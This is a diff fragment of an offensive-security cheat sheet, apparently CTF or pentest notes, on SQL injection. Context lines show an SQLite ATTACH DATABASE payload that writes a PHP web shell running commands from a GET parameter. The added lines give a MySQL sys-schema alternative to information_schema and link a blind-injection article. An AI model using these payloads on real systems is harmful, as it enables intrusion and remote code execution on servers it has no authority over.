@@ -160,6 +160,12 @@ ATTACH DATABASE '/var/www/html/y.php' AS y;--
 CREATE TABLE y.p (dataz text);--
 INSERT INTO y.p (dataz) VALUES ('<? system($_GET[''cmd'']);?>');--
 ```  
+#### Alternatives to information_schema table
+```sql
+SELECT * FROM sys.x$schema_flattened_keys;
+```
+Blind SQL Injection without _in_:  
+https://medium.com/@terjanq/blind-sql-injection-without-an-in-1e14ba1d4952  
 ### PHP
 ### finfo with specific comment
 ```php
